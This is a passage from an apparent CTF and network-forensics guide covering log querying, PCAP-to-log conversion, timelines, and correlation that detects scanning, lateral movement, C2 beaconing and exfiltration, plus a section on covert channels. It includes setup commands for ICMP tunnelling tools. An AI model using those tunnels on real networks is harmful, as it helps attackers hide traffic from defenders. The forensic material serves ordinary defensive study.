            print(f"Match: {match[:200]}")
    else:
        analyze_logs(logs)
```

### ElasticSearch-Style Queries with jq

**Complex Query Examples:**

```bash
# Boolean query (must match all conditions)
jq 'select(
    .level == "ERROR" and
    (.source_ip | startswith("192.168.")) and
    .timestamp >= "2025-10-19T00:00:00"
)' logfile.json

# Range queries
jq 'select(.status >= 200 and .status < 300)' logfile.json
jq 'select(.request_time > 0.5 and .request_time < 5.0)' logfile.json

# Wildcard matching
jq 'select(.request_uri | test("^/api/.*admin.*"))' logfile.json

# Exists query
jq 'select(.error_code != null)' logfile.json
jq 'select(has("user_id"))' logfile.json

# Terms query (match any)
jq 'select(.status | IN(200, 201, 204))' logfile.json
jq 'select([.status] | inside([200, 201, 204]))' logfile.json

# Prefix query
jq 'select(.request_uri | startswith("/api/v1/"))' logfile.json

# Aggregations
jq -s 'group_by(.status) | 
       map({
         key: .[0].status, 
         doc_count: length,
         avg_response_time: (map(.request_time) | add / length)
       })' logfile.json

# Nested aggregations
jq -s 'group_by(.source_ip) | 
       map({
         ip: .[0].source_ip,
         total: length,
         by_status: (group_by(.status) | 
                     map({status: .[0].status, count: length}))
       })' logfile.json
```

### Log Correlation Across Multiple Sources

**Multi-Source Correlation Script:**

```bash
#!/bin/bash
# correlate_multi_source.sh

ZEEK_CONN="/path/to/conn.log"
SURICATA_EVE="/path/to/eve.json"
SYSLOG="/var/log/syslog"
OUTPUT_DIR="./correlation_results"

mkdir -p "$OUTPUT_DIR"

echo "=== Multi-Source Log Correlation ==="

# Extract suspicious IPs from Suricata
echo "Extracting suspicious IPs from Suricata alerts..."
jq -r 'select(.event_type=="alert") | .src_ip' "$SURICATA_EVE" | \
    sort -u > "$OUTPUT_DIR/suricata_suspicious_ips.txt"

# Find these IPs in Zeek conn.log
echo "Correlating with Zeek connection logs..."
while read ip; do
    echo "=== Traffic from $ip ===" >> "$OUTPUT_DIR/zeek_correlation.txt"
    grep "$ip" "$ZEEK_CONN" | zeek-cut ts id.orig_h id.resp_h id.resp_p service \
        >> "$OUTPUT_DIR/zeek_correlation.txt"
done < "$OUTPUT_DIR/suricata_suspicious_ips.txt"

# Check syslog for these IPs
echo "Correlating with syslog..."
while read ip; do
    grep "$ip" "$SYSLOG" >> "$OUTPUT_DIR/syslog_correlation.txt"
done < "$OUTPUT_DIR/suricata_suspicious_ips.txt"

# Generate timeline
echo "Generating correlation timeline..."
{
    # Suricata alerts
    jq -r 'select(.event_type=="alert") | 
           "\(.timestamp) SURICATA \(.src_ip) \(.alert.signature)"' \
           "$SURICATA_EVE"
    
    # Zeek connections (convert to ISO timestamp)
    grep -f "$OUTPUT_DIR/suricata_suspicious_ips.txt" "$ZEEK_CONN" | \
        zeek-cut ts id.orig_h id.resp_h service | \
        awk '{print strftime("%Y-%m-%dT%H:%M:%S", $1), "ZEEK", $2, $3, $4}'
    
    # Syslog entries
    grep -f "$OUTPUT_DIR/suricata_suspicious_ips.txt" "$SYSLOG" | \
        awk '{print $1"T"$2, "SYSLOG", $0}'
        
} | sort > "$OUTPUT_DIR/correlation_timeline.txt"

echo "Results saved to $OUTPUT_DIR/"
echo "Summary:"
echo "  - $(wc -l < "$OUTPUT_DIR/suricata_suspicious_ips.txt") unique suspicious IPs"
echo "  - $(wc -l < "$OUTPUT_DIR/zeek_correlation.txt") Zeek correlations"
echo "  - $(wc -l < "$OUTPUT_DIR/syslog_correlation.txt") Syslog correlations"
echo "  - $(wc -l < "$OUTPUT_DIR/correlation_timeline.txt") total timeline events"
```

### Real-Time JSON Log Monitoring

**Live Monitoring Script:**

```bash
#!/bin/bash
# monitor_json_logs.sh

LOGFILE="$1"
ALERT_EMAIL="${2:-admin@example.com}"

if [ -z "$LOGFILE" ]; then
    echo "Usage: $0 <json_logfile> [alert_email]"
    exit 1
fi

echo "Monitoring $LOGFILE for security events..."

# Monitor for specific patterns
tail -f "$LOGFILE" | while read -r line; do
    # Parse JSON
    event=$(echo "$line" | jq -r '.event_type // empty')
    severity=$(echo "$line" | jq -r '.severity // empty')
    source_ip=$(echo "$line" | jq -r '.source_ip // empty')
    message=$(echo "$line" | jq -r '.message // empty')
    
    # Alert on high-severity events
    if [ "$severity" = "high" ] || [ "$severity" = "critical" ]; then
        echo "[ALERT] High-severity event detected:"
        echo "  Type: $event"
        echo "  Source: $source_ip"
        echo "  Message: $message"
        
        # Send email alert (requires mailutils)
        # echo "$message" | mail -s "[SECURITY] High-severity event from $source_ip" "$ALERT_EMAIL"
    fi
    
    # Alert on specific event types
    case "$event" in
        "authentication_failure")
            echo "[WARNING] Authentication failure from $source_ip"
            ;;
        "port_scan")
            echo "[WARNING] Port scan detected from $source_ip"
            ;;
        "sql_injection")
            echo "[CRITICAL] SQL injection attempt from $source_ip"
            ;;
    esac
done
```

---

**Important Related Topics**

**ELK Stack Integration:** Logstash pipelines, Elasticsearch queries, Kibana visualization, index management

**SIEM Platforms:** Splunk query language, AlienVault OSSIM, Wazuh integration, Security Onion deployment

**Log Enrichment:** GeoIP lookups, threat intelligence feeds, WHOIS integration, reputation scoring

**Time Series Analysis:** Anomaly detection algorithms, baseline establishment, deviation alerting, trend identification

**Incident Response Workflows:** Log preservation, chain of custody, timeline reconstruction, evidence correlation

---

## PCAP to Log Conversion

### Converting PCAP to Text-Based Logs

**tshark - Primary Conversion Tool**

```bash
# Basic PCAP to text log
tshark -r capture.pcap > capture.log

# Custom field extraction (CSV-like format)
tshark -r capture.pcap -T fields -e frame.number -e frame.time \
  -e ip.src -e ip.dst -e tcp.srcport -e tcp.dstport -e http.request.uri \
  -E header=y -E separator=, -E quote=d > http_traffic.csv

# JSON output for programmatic processing
tshark -r capture.pcap -T json > capture.json

# PDML (Packet Details Markup Language) for structured parsing
tshark -r capture.pcap -T pdml > capture.pdml

# Extract specific protocols to separate logs
tshark -r capture.pcap -Y "http" -T fields -e frame.time \
  -e ip.src -e http.host -e http.request.method \
  -e http.request.uri -E header=y -E separator=, > http.log
```

**Protocol-Specific Log Extraction**

```bash
# DNS queries with timestamps
tshark -r capture.pcap -Y "dns.qry.name" -T fields \
  -e frame.time -e ip.src -e dns.qry.name -e dns.qry.type \
  -E header=y -E separator=, > dns_queries.log

# TLS/SSL connections
tshark -r capture.pcap -Y "ssl.handshake.type == 1" -T fields \
  -e frame.time -e ip.src -e ip.dst -e ssl.handshake.extensions_server_name \
  -E header=y -E separator=, > tls_connections.log

# SMB/CIFS activity
tshark -r capture.pcap -Y "smb || smb2" -T fields \
  -e frame.time -e ip.src -e ip.dst -e smb.cmd -e smb2.filename \
  -E header=y -E separator=, > smb_activity.log

# Failed TCP connections (RST flags)
tshark -r capture.pcap -Y "tcp.flags.reset == 1" -T fields \
  -e frame.time -e ip.src -e ip.dst -e tcp.srcport -e tcp.dstport \
  -E header=y -E separator=, > tcp_resets.log
```

**tcpdump Text Conversion**

```bash
# Verbose ASCII output
tcpdump -r capture.pcap -tttt -n -vvv > capture_detailed.log

# Hex + ASCII output for payload inspection
tcpdump -r capture.pcap -tttt -n -XX > capture_hex.log

# Protocol-specific filtering during conversion
tcpdump -r capture.pcap -n 'tcp port 80 or tcp port 443' -A > web_traffic.log
```

**argus - Flow Record Conversion**

```bash
# Convert PCAP to argus flow records
argus -r capture.pcap -w capture.argus

# Generate human-readable flow logs
ra -r capture.argus -n > flow_records.log

# CSV format with specific fields
ra -r capture.argus -s stime dur proto saddr sport dir daddr dport \
  bytes pkts -L0 -c, > flows.csv
```

### Specialized Conversion Tools

**chaosreader - Session Reconstruction**

```bash
# Extract all sessions to individual files
chaosreader capture.pcap

# Creates index.html and extracts:
# - HTTP objects (images, HTML, scripts)
# - Telnet/FTP sessions
# - Email content
# - TCP session replays
```

**NetworkMiner - Automated Extraction** [Inference]

```bash
# CLI mode (if available)
networkminer-cli -r capture.pcap -o output_directory/

# Extracts:
# - Files transferred
# - Credentials
# - DNS hostnames
# - OS fingerprints
# Organized into structured directories
```

**tcpflow - Content Extraction**

```bash
# Extract TCP streams to individual files
tcpflow -r capture.pcap -o tcp_flows/

# Each TCP session saved as:
# xxx.xxx.xxx.xxx.ppppp-yyy.yyy.yyy.yyy.qqqqq

# Extract only HTTP content
tcpflow -r capture.pcap -e http -o http_objects/
```

### Custom Scripting Conversion

**Python with scapy**

```python
from scapy.all import rdpcap, IP, TCP
import csv

packets = rdpcap('capture.pcap')

with open('custom_log.csv', 'w', newline='') as f:
    writer = csv.writer(f)
    writer.writerow(['timestamp', 'src_ip', 'dst_ip', 'protocol', 
                     'src_port', 'dst_port', 'length'])
    
    for pkt in packets:
        if IP in pkt:
            timestamp = pkt.time
            src = pkt[IP].src
            dst = pkt[IP].dst
            proto = pkt[IP].proto
            length = len(pkt)
            
            src_port = pkt[TCP].sport if TCP in pkt else ''
            dst_port = pkt[TCP].dport if TCP in pkt else ''
            
            writer.writerow([timestamp, src, dst, proto, 
                           src_port, dst_port, length])
```

**Python with pyshark**

```python
import pyshark

cap = pyshark.FileCapture('capture.pcap')

with open('http_requests.log', 'w') as f:
    for pkt in cap:
        try:
            if hasattr(pkt, 'http'):
                timestamp = pkt.sniff_time
                src_ip = pkt.ip.src
                method = pkt.http.request_method
                host = pkt.http.host
                uri = pkt.http.request_uri
                
                log_line = f"{timestamp} | {src_ip} | {method} {host}{uri}\n"
                f.write(log_line)
        except AttributeError:
            continue
```

---

## Timeline Creation

### Basic Timeline Generation

**capinfos - Quick Timeline Bounds**

```bash
# Get capture time range
capinfos -a -e capture.pcap

# Output shows:
# First packet: 2024-01-15 10:23:45
# Last packet: 2024-01-15 11:47:32
```

**tshark Timeline Export**

```bash
# Chronological event timeline with all protocols
tshark -r capture.pcap -T fields -e frame.number -e frame.time_relative \
  -e ip.src -e ip.dst -e _ws.col.Protocol -e _ws.col.Info \
  -E header=y -E separator='|' > timeline_full.log

# HTTP-specific timeline
tshark -r capture.pcap -Y "http.request || http.response" \
  -T fields -e frame.time -e ip.src -e ip.dst \
  -e http.request.method -e http.request.uri -e http.response.code \
  -E header=y -E separator='|' > http_timeline.log

# DNS resolution timeline
tshark -r capture.pcap -Y "dns" -T fields \
  -e frame.time -e ip.src -e dns.qry.name -e dns.resp.addr \
  -E header=y -E separator='|' > dns_timeline.log
```

### Advanced Timeline Construction

**Plaso/log2timeline - Comprehensive Timeline**

```bash
# Install plaso
apt-get install plaso-tools

# Create timeline from PCAP
log2timeline.py --parsers="pcap" timeline.plaso capture.pcap

# Export to CSV
psort.py -o l2tcsv -w timeline.csv timeline.plaso

# Export with filters
psort.py -o l2tcsv -w filtered_timeline.csv timeline.plaso \
  "date > '2024-01-15 10:00:00' AND date < '2024-01-15 12:00:00'"
```

**argus Flow Timeline**

```bash
# Generate flow timeline with durations
ra -r capture.argus -s stime ltime dur proto saddr sport daddr dport \
  -n -Z b | sort > flow_timeline.log

# Timeline with aggregated statistics
racluster -r capture.argus -m saddr daddr proto dport -s stime ltime \
  dur bytes pkts -n > aggregated_timeline.log
```

### Protocol-Specific Timelines

**TCP Connection Timeline**

```bash
# SYN packets (connection initiations)
tshark -r capture.pcap -Y "tcp.flags.syn == 1 && tcp.flags.ack == 0" \
  -T fields -e frame.time -e ip.src -e ip.dst -e tcp.dstport \
  -E header=y -E separator='|' > tcp_syn_timeline.log

# Full three-way handshake timeline
tshark -r capture.pcap -Y "tcp.flags.syn == 1 || tcp.flags.fin == 1 || tcp.flags.reset == 1" \
  -T fields -e frame.time -e ip.src -e ip.dst -e tcp.srcport \
  -e tcp.dstport -e tcp.flags -E header=y -E separator='|' > tcp_session_timeline.log
```

**Authentication Timeline**

```bash
# HTTP authentication attempts
tshark -r capture.pcap -Y "http.authorization || http.www_authenticate" \
  -T fields -e frame.time -e ip.src -e http.host \
  -e http.authorization -e http.response.code \
  -E header=y -E separator='|' > http_auth_timeline.log

# SMB authentication
tshark -r capture.pcap -Y "ntlmssp" -T fields \
  -e frame.time -e ip.src -e ip.dst -e ntlmssp.messagetype \
  -e ntlmssp.auth.username -e ntlmssp.auth.domain \
  -E header=y -E separator='|' > smb_auth_timeline.log

# Kerberos authentication
tshark -r capture.pcap -Y "kerberos" -T fields \
  -e frame.time -e ip.src -e ip.dst -e kerberos.msg_type \
  -e kerberos.CNameString -E header=y -E separator='|' > kerberos_timeline.log
```

**Data Exfiltration Timeline**

```bash
# Large outbound transfers
tshark -r capture.pcap -Y "ip.len > 1400 && ip.dst != 192.168.0.0/16" \
  -T fields -e frame.time -e ip.src -e ip.dst -e ip.len \
  -e _ws.col.Protocol -E header=y -E separator='|' > large_transfers_timeline.log

# DNS tunneling candidates (large queries/responses)
tshark -r capture.pcap -Y "dns && (frame.len > 512 || dns.qry.name.len > 50)" \
  -T fields -e frame.time -e ip.src -e dns.qry.name -e frame.len \
  -E header=y -E separator='|' > dns_tunneling_timeline.log
```

### Visual Timeline Generation

**Gnuplot Timeline Visualization** [Inference]

```bash
# Generate data for plotting (connections over time)
tshark -r capture.pcap -T fields -e frame.time_epoch \
  -e tcp.flags.syn -Y "tcp.flags.syn == 1" | \
  awk '{print $1, 1}' > syn_timeline.dat

# Gnuplot script
cat > plot_timeline.gnu << 'EOF'
set terminal png size 1200,600
set output 'connection_timeline.png'
set xdata time
set timefmt "%s"
set format x "%H:%M:%S"
set xlabel "Time"
set ylabel "Connection Attempts"
plot 'syn_timeline.dat' using 1:2 with impulses title 'SYN packets'
EOF

gnuplot plot_timeline.gnu
```

**Timeline with Elastic Stack** [Inference]

```bash
# Convert PCAP to JSON for Elasticsearch
tshark -r capture.pcap -T ek > packets.json

# Import to Elasticsearch
curl -X POST "localhost:9200/_bulk" -H 'Content-Type: application/json' \
  --data-binary @packets.json

# Kibana provides visual timeline exploration
# Access at http://localhost:5601
```

---

## Multi-Source Correlation

### Log Aggregation Framework

**Combining PCAP with System Logs**

```bash
# Extract timestamps from PCAP
tshark -r capture.pcap -T fields -e frame.time_epoch \
  -e ip.src -e ip.dst -e _ws.col.Info > pcap_events.log

# Merge with auth.log based on timestamp
# Both sources need epoch timestamps for correlation

# Python correlation script
cat > correlate_logs.py << 'EOF'
import csv
from datetime import datetime

pcap_events = []
with open('pcap_events.log', 'r') as f:
    for line in f:
        parts = line.strip().split('\t')
        if len(parts) >= 4:
            pcap_events.append({
                'timestamp': float(parts[0]),
                'src': parts[1],
                'dst': parts[2],
                'info': parts[3]
            })

auth_events = []
with open('auth.log', 'r') as f:
    for line in f:
        # Parse syslog timestamp (varies by format)
        # Example: Jan 15 10:23:45
        pass

# Merge and sort by timestamp
all_events = sorted(pcap_events + auth_events, key=lambda x: x['timestamp'])

with open('correlated_timeline.csv', 'w') as f:
    writer = csv.DictWriter(f, fieldnames=['timestamp', 'source', 'event'])
    writer.writeheader()
    for event in all_events:
        writer.writerow({
            'timestamp': datetime.fromtimestamp(event['timestamp']),
            'source': event.get('src', 'system'),
            'event': event.get('info', event.get('message'))
        })
EOF

python3 correlate_logs.py
```

### IP-Based Correlation

**Identify Suspicious IPs Across Sources**

```bash
# Extract unique IPs from PCAP
tshark -r capture.pcap -T fields -e ip.src -e ip.dst | \
  tr '\t' '\n' | sort -u > pcap_ips.txt

# Cross-reference with threat intelligence feeds
while read ip; do
    # Check against local threat feed
    grep "$ip" threat_feed.txt >> suspicious_ips.txt
    
    # AbuseIPDB lookup (requires API key)
    # curl -G https://api.abuseipdb.com/api/v2/check \
    #   --data-urlencode "ipAddress=$ip" \
    #   -H "Key: YOUR_API_KEY" -H "Accept: application/json"
done < pcap_ips.txt

# Find all PCAP events involving suspicious IPs
tshark -r capture.pcap -Y "ip.addr in {$(cat suspicious_ips.txt | paste -sd,)}" \
  -T fields -e frame.time -e ip.src -e ip.dst -e _ws.col.Info \
  -E header=y -E separator='|' > suspicious_events.log
```

**Correlate with Firewall/IDS Logs**

```bash
# Extract blocked IPs from firewall log
grep "DENY" firewall.log | awk '{print $5}' | sort -u > blocked_ips.txt

# Find PCAP traffic to/from blocked IPs
tshark -r capture.pcap -Y "ip.addr in {$(cat blocked_ips.txt | paste -sd,)}" \
  > blocked_traffic.log

# Correlate timing: traffic before vs after block
tshark -r capture.pcap -Y "ip.dst == BLOCKED_IP" \
  -T fields -e frame.time -e tcp.flags > pre_block_attempts.log
```

### Session Correlation

**Track Complete Attack Chain**

```bash
# 1. DNS resolution
tshark -r capture.pcap -Y "dns.qry.name contains suspicious.com" \
  -T fields -e frame.time -e ip.src -e dns.qry.name -e dns.resp.addr \
  > step1_dns.log

# 2. TCP connection to resolved IP
RESOLVED_IP=$(tail -1 step1_dns.log | awk '{print $4}')
tshark -r capture.pcap -Y "ip.dst == $RESOLVED_IP && tcp.flags.syn == 1" \
  -T fields -e frame.time -e ip.src -e tcp.dstport \
  > step2_connection.log

# 3. HTTP requests to that IP
tshark -r capture.pcap -Y "ip.dst == $RESOLVED_IP && http.request" \
  -T fields -e frame.time -e http.request.method -e http.request.uri \
  > step3_http.log

# 4. Data transfer
tshark -r capture.pcap -Y "ip.dst == $RESOLVED_IP" \
  -T fields -e frame.time -e tcp.len -z io,stat,1 \
  > step4_data_transfer.log
```

**TCP Stream Correlation**

```bash
# Identify related TCP streams
tshark -r capture.pcap -Y "ip.src == ATTACKER_IP" \
  -T fields -e tcp.stream | sort -u > attacker_streams.txt

# Extract all packets from those streams
while read stream_id; do
    tshark -r capture.pcap -Y "tcp.stream == $stream_id" \
      -w stream_${stream_id}.pcap
    
    # Analyze each stream
    tshark -r stream_${stream_id}.pcap -q -z conv,tcp
done < attacker_streams.txt
```

### Behavioral Correlation

**Port Scanning Detection via Correlation**

```bash
# Extract SYN packets from PCAP
tshark -r capture.pcap -Y "tcp.flags.syn == 1 && tcp.flags.ack == 0" \
  -T fields -e frame.time -e ip.src -e ip.dst -e tcp.dstport \
  > syn_packets.log

# Identify scanning behavior (many ports from single source)
awk '{print $2, $4}' syn_packets.log | sort | uniq -c | \
  awk '$1 > 10 {print $2, $1 " ports"}' > potential_scanners.log

# Correlate with IDS alerts
grep -f potential_scanners.log snort.alert > confirmed_scans.log
```

**Lateral Movement Correlation**

```bash
# Initial compromise host
INITIAL_HOST="192.168.1.50"

# Find SMB connections from compromised host
tshark -r capture.pcap -Y "ip.src == $INITIAL_HOST && smb2" \
  -T fields -e frame.time -e ip.dst -e smb2.cmd -e smb2.filename \
  > smb_from_compromised.log

# Find RDP connections
tshark -r capture.pcap -Y "ip.src == $INITIAL_HOST && tcp.dstport == 3389" \
  -T fields -e frame.time -e ip.dst > rdp_from_compromised.log

# Find WMI/WinRM activity
tshark -r capture.pcap -Y "ip.src == $INITIAL_HOST && (tcp.dstport == 5985 || tcp.dstport == 5986)" \
  -T fields -e frame.time -e ip.dst > winrm_from_compromised.log

# Combine into lateral movement timeline
cat smb_from_compromised.log rdp_from_compromised.log winrm_from_compromised.log | \
  sort -k1 > lateral_movement_timeline.log
```

### Anomaly Correlation

**Volume-Based Anomalies**

```bash
# Calculate per-host traffic volume
tshark -r capture.pcap -q -z conv,ip | grep -v "^=" | \
  awk 'NF==7 {print $1, $5}' | sort -k2 -nr > traffic_volume.log

# Identify outliers (top 1% by volume)
THRESHOLD=$(awk '{print $2}' traffic_volume.log | \
  sort -n | awk 'NR==int(NR*0.99) {print; exit}')

awk -v thresh=$THRESHOLD '$2 > thresh' traffic_volume.log > outlier_hosts.log

# Extract all traffic from outlier hosts
while read host volume; do
    tshark -r capture.pcap -Y "ip.addr == $host" \
      -w outlier_${host}.pcap
done < outlier_hosts.log
```

**Temporal Anomalies**

```bash
# Traffic distribution by hour
tshark -r capture.pcap -T fields -e frame.time_epoch | \
  awk '{print strftime("%Y-%m-%d %H:00", $1)}' | \
  sort | uniq -c > hourly_distribution.log

# Identify off-hours activity (example: 22:00 - 06:00)
awk '$2 ~ /22:00|23:00|00:00|01:00|02:00|03:00|04:00|05:00/ {print}' \
  hourly_distribution.log > off_hours_activity.log

# Extract packets from anomalous hours
tshark -r capture.pcap -Y "frame.time >= \"2024-01-15 22:00:00\" && frame.time <= \"2024-01-16 06:00:00\"" \
  -w off_hours_traffic.pcap
```

### Cross-Protocol Correlation

**C2 Communication Pattern Detection**

```bash
# DNS beaconing (periodic queries to same domain)
tshark -r capture.pcap -Y "dns.qry.name" -T fields \
  -e frame.time_epoch -e dns.qry.name | \
  awk '{print $1, $2}' | sort -k2,2 -k1,1n > dns_timeline.log

# Analyze for periodic patterns
awk '{domain=$2; times[domain]=times[domain]" "$1} 
     END {for (d in times) print d, times[d]}' dns_timeline.log | \
  while read domain times; do
    # Calculate time deltas (requires further processing)
    echo "$domain: $times"
  done > dns_periodicity.log

# HTTP beaconing to same endpoint
tshark -r capture.pcap -Y "http.request" -T fields \
  -e frame.time_epoch -e http.host -e http.request.uri | \
  sort -k2,2 -k1,1n > http_timeline.log

# Correlate DNS + HTTP for full C2 picture
# Domain from DNS should match HTTP Host header
```

**Credential Harvesting Correlation**

```bash
# HTTP POST to login forms
tshark -r capture.pcap -Y "http.request.method == POST && http.request.uri contains login" \
  -T fields -e frame.time -e ip.src -e http.host -e http.file_data \
  > http_post_logins.log

# FTP authentication attempts
tshark -r capture.pcap -Y "ftp.request.command == USER || ftp.request.command == PASS" \
  -T fields -e frame.time -e ip.src -e ftp.request.arg \
  > ftp_auth.log

# Telnet sessions (plaintext credentials)
tshark -r capture.pcap -Y "telnet" -T fields \
  -e frame.time -e ip.src -e ip.dst -e telnet.data \
  > telnet_sessions.log

# Combine all credential-related activity
cat http_post_logins.log ftp_auth.log telnet_sessions.log | \
  sort > all_auth_attempts.log
```

### Correlation Tools Integration

**SIEM-Style Correlation with Splunk** [Inference]

```bash
# Export PCAP data to Splunk-compatible format
tshark -r capture.pcap -T fields -e frame.time -e ip.src -e ip.dst \
  -e _ws.col.Protocol -e _ws.col.Info -E separator=, \
  -E header=y -E quote=d > splunk_import.csv

# Splunk query examples:
# sourcetype=pcap | stats count by ip.src | where count > 1000
# sourcetype=pcap ip.dst=EXTERNAL_IP | timechart span=1m count
# sourcetype=pcap AND sourcetype=auth | transaction ip.src maxspan=5m
```

**ELK Stack Correlation** [Inference]

```bash
# Use packetbeat for real-time ingestion (alternative to PCAP import)
# Or use logstash with PCAP codec

# Logstash config for PCAP:
cat > logstash-pcap.conf << 'EOF'
input {
  file {
    path => "/path/to/capture.pcap"
    codec => pcap {
      payload_protocol => "tcp"
    }
  }
}

filter {
  # Add geoip enrichment
  geoip {
    source => "[layers][ip][dst]"
  }
}

output {
  elasticsearch {
    hosts => ["localhost:9200"]
    index => "pcap-%{+YYYY.MM.dd}"
  }
}
EOF

# Kibana queries for correlation:
# layers.ip.src: "ATTACKER_IP" AND layers.tcp.dstport: (22 OR 3389 OR 445)
# layers.http.request.method: "POST" AND layers.http.response.code: >= 400
```

### CTF-Specific Correlation Scenarios

**Flag Exfiltration Tracking**

```bash
# Assume flag format: FLAG{...}

# Search HTTP traffic for flag pattern
tshark -r capture.pcap -Y "http" -T fields -e http.file_data | \
  grep -o 'FLAG{[^}]*}' > flags_in_http.txt

# Search DNS for flag in query/response (DNS exfil)
tshark -r capture.pcap -Y "dns" -T fields -e dns.qry.name | \
  grep -o 'FLAG{[^}]*}' > flags_in_dns.txt

# Search ICMP for flag in payload
tshark -r capture.pcap -Y "icmp" -T fields -e data.data | \
  xxd -r -p | grep -o 'FLAG{[^}]*}' > flags_in_icmp.txt

# Combine and deduplicate
cat flags_in_*.txt | sort -u > all_flags.txt

# Find exact packets containing flags
while read flag; do
    tshark -r capture.pcap -Y "frame contains \"$flag\"" \
      -T fields -e frame.number -e frame.time -e _ws.col.Info
done < all_flags.txt > flag_packets.log
```

**Multi-Stage Attack Correlation**

```bash
# Stage 1: Reconnaissance
tshark -r capture.pcap -Y "dns || icmp.type == 8" | wc -l > recon_count.txt

# Stage 2: Exploitation attempt
tshark -r capture.pcap -Y "http.request.method == POST || tcp.dstport in {21,22,23,3389}" \
  -T fields -e frame.time -e ip.dst -e tcp.dstport > exploit_attempts.log

# Stage 3: Post-exploitation (C2 callback)
tshark -r capture.pcap -Y "tcp.flags.syn == 1 && ip.dst != 192.168.0.0/16" \
  -T fields -e frame.time -e ip.dst -e tcp.dstport | \
  sort -k2 | uniq -c | awk '$1 > 5' > c2_candidates.log

# Stage 4: Data exfiltration
tshark -r capture.pcap -Y "ip.src == COMPROMISED_HOST && ip.dst != 192.168.0.0/16" \
  -q -z io,stat,1,"SUM(ip.len)ip.src==$COMPROMISED_HOST" > exfil_volume.log

# Combine stages into attack narrative
paste -d'|' <(echo "Recon:"; cat recon_count.txt) \
             <(echo "Exploit:"; wc -l < exploit_attempts.log) \
             <(echo "C2:"; wc -l < c2_candidates.log) \
             <(echo "Exfil:"; tail -1 exfil_volume.log) \
  > attack_summary.txt
```

---

## Important Related Topics

- **Statistical Analysis of Network Traffic**: Baseline establishment, anomaly detection algorithms
- **Threat Intelligence Integration**: IOC matching, automated enrichment pipelines
- **Incident Response Workflow**: Evidence preservation, chain of custody for log artifacts
- **Python/Scapy Advanced Automation**: Custom correlation scripts for complex multi-source analysis

---

# Steganography in Network Traffic

Network steganography involves hiding data within legitimate network protocols to evade detection. Unlike encryption (which makes data unreadable), steganography conceals the existence of communication itself. In CTF scenarios, identifying and extracting hidden data from network traffic is a critical skill.

## Covert Channels

Covert channels exploit unused or optional protocol fields to transmit hidden information without raising suspicion.

### Common Covert Channel Locations

**IP Header Fields:**

- IP Identification field (16 bits)
- Type of Service (ToS) field
- IP options field
- Fragment offset manipulation

**TCP Header Fields:**

- Initial Sequence Number (ISN) encoding
- TCP timestamp options
- Urgent pointer field
- Reserved bits
- TCP options padding

**Protocol-Agnostic Methods:**

- Timing channels (inter-packet delays)
- Packet size modulation
- Protocol field ordering

### Detection and Extraction Tools

**Scapy (Python-based packet manipulation):**

```bash
# Extract data from IP ID fields
scapy
>>> pkts = rdpcap('capture.pcap')
>>> data = [pkt[IP].id for pkt in pkts if IP in pkt]
>>> ''.join(chr(x & 0xFF) for x in data)

# Analyze TCP sequence number entropy
>>> seq_nums = [pkt[TCP].seq for pkt in pkts if TCP in pkt]
>>> import numpy as np
>>> np.std(seq_nums)  # High variance may indicate covert channel
```

**Tshark field extraction:**

```bash
# Extract IP ID fields as hex
tshark -r capture.pcap -T fields -e ip.id -Y "ip" > ip_ids.txt

# Extract TCP timestamps
tshark -r capture.pcap -T fields -e tcp.options.timestamp.tsval -Y "tcp"

# Extract ToS values
tshark -r capture.pcap -T fields -e ip.dsfield.dscp -Y "ip"
```

**Wireshark analysis:**

- Statistics → Conversations → check for unusual packet patterns
- Statistics → I/O Graph → plot specific field values over time
- Apply display filter: `ip.id` or `tcp.options.timestamp`
- Export Packet Dissections → As Plain Text → select specific fields

### Practical Extraction Methodology

**Step 1: Identify anomalies**

```bash
# Statistical analysis of header fields
tshark -r capture.pcap -T fields -e ip.id | sort | uniq -c | sort -rn

# Check for non-standard field values
tshark -r capture.pcap -Y "ip.flags.rb == 1"  # Reserved bit set
```

**Step 2: Extract and decode**

```python
#!/usr/bin/env python3
from scapy.all import *

def extract_ip_id_data(pcap_file):
    pkts = rdpcap(pcap_file)
    data = []
    for pkt in pkts:
        if IP in pkt:
            # Extract lower byte of IP ID
            data.append(pkt[IP].id & 0xFF)
    
    # Try ASCII conversion
    result = bytes(data)
    print(f"Raw hex: {result.hex()}")
    print(f"ASCII: {result.decode('ascii', errors='ignore')}")
    
    # Try base64 decode
    import base64
    try:
        decoded = base64.b64decode(result)
        print(f"Base64 decoded: {decoded}")
    except:
        pass

extract_ip_id_data('capture.pcap')
```

## ICMP Tunneling

ICMP tunneling exploits the ICMP protocol (typically used for ping) to encapsulate and transmit arbitrary data. Many firewalls allow ICMP traffic, making it attractive for covert channels.

### Common ICMP Tunneling Tools

**ptunnel (ICMP tunnel proxy):**

```bash
# Installation
apt-get install ptunnel-ng

# Server side (listening)
ptunnel-ng -p<proxy_ip>

# Client side (forwarding traffic through ICMP)
ptunnel-ng -p<proxy_ip> -lp<local_port> -da<destination_ip> -dp<destination_port>
```

**icmptunnel:**

```bash
git clone https://github.com/DhavalKapil/icmptunnel
cd icmptunnel
make

# Server
./icmptunnel -s

# Client
./icmptunnel <server_ip>
```

**Hans (IP over ICMP):**

```bash
apt-get install hans

# Server mode
hans -s 10.1.2.0 -p password

# Client mode
hans -c <server_ip> -p password
```

### Detection Techniques

**Anomaly indicators:**

- Unusually large ICMP payload sizes (normal ping = 56 bytes)
- High volume of ICMP traffic
- ICMP packets to/from non-gateway hosts
- ICMP packets with non-standard Type/Code combinations
- Sequential or patterned ICMP ID/Sequence numbers

**Wireshark filters:**

```
# Large ICMP packets
icmp && data.len > 64

# ICMP with unusual types
icmp.type != 8 && icmp.type != 0

# High frequency ICMP
icmp && frame.time_delta < 0.01
```

**Tshark analysis:**

```bash
# Extract ICMP payload sizes
tshark -r capture.pcap -Y "icmp" -T fields -e data.len | sort -n | uniq -c

# Extract ICMP data payloads
tshark -r capture.pcap -Y "icmp.type == 8" -T fields -e data.data > icmp_data.hex

# Count ICMP packets per source
tshark -r capture.pcap -Y "icmp" -T fields -e ip.src | sort | uniq -c | sort -rn

# Detect non-standard ICMP payloads
tshark -r capture.pcap -Y "icmp && !(data.data matches \"[0-9a-f]{16}\")"
```

### Data Extraction from ICMP

**Python extraction script:**

```python
#!/usr/bin/env python3
from scapy.all import *

def extract_icmp_data(pcap_file):
    pkts = rdpcap(pcap_file)
    data = b''
    
    for pkt in pkts:
        if ICMP in pkt and pkt[ICMP].type == 8:  # Echo request
            if Raw in pkt:
                payload = bytes(pkt[Raw].load)
                # Skip standard ping pattern (timestamp + padding)
                if len(payload) > 48:  # Standard ping is 48 bytes
                    data += payload[48:]  # Extract excess data
    
    # Save to file
    with open('extracted_icmp.bin', 'wb') as f:
